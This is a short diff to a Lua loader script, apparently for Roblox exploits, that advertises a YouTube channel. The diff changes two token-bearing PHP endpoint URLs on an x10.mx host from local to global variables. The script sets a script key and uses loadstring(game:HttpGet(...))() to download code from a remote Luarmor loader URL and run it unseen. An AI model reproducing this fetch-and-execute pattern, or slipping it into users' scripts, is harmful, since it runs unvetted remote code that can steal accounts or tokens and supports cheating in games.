@@ -2,8 +2,8 @@
 -- 🎞️ My Youtube Is: https://www.youtube.com/@NexusHideoutUG 📸
 -- 📚 My Information Is: https://zyo.lol/Sxionax 💬
 
-local MxqLkVgWrNz = "https://mnusssxionax.x10.mx/DsD9mtxVCGim.php"
-local UhqTrJdNmXy = "https://mnusssxionax.x10.mx/tvfacpwcESQM.php?token="
+MxqLkVgWrNz = "https://mnusssxionax.x10.mx/DsD9mtxVCGim.php"
+UhqTrJdNmXy = "https://mnusssxionax.x10.mx/tvfacpwcESQM.php?token="
 
 script_key="AqeYvIvPwphUKNmOUCYWpKSqrcGrBGYv";
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5cd11226207926f0f54f8a910f208d1b.lua"))()
